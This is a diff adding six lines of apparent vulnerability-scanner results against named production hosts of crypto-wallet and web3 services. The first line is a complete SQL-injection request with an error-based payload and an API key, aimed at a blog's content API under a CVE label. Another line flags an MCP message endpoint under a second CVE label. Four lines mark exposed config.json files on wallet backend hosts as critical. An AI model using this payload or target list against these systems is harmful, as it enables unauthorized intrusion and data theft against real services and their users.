@@ -1,0 +1,6 @@
+[CVE-2026-26980] [http] [critical] https://blog.web3auth.io/ghost/api/content/tags/?key=24330868b746f42d2fb5110e63&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-import-2024-02-27-00-35]
+[CVE-2026-33032] [http] [critical] https://btc-mainnet-backend.phantom.app/mcp_message
+[config-json-exposure-fuzz] [http] [critical] https://btc1.trezor.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://btc2.trezor.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://btc3.trezor.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://btc4.trezor.io/api/v2/config.json [path="/api/v2/config.json"]
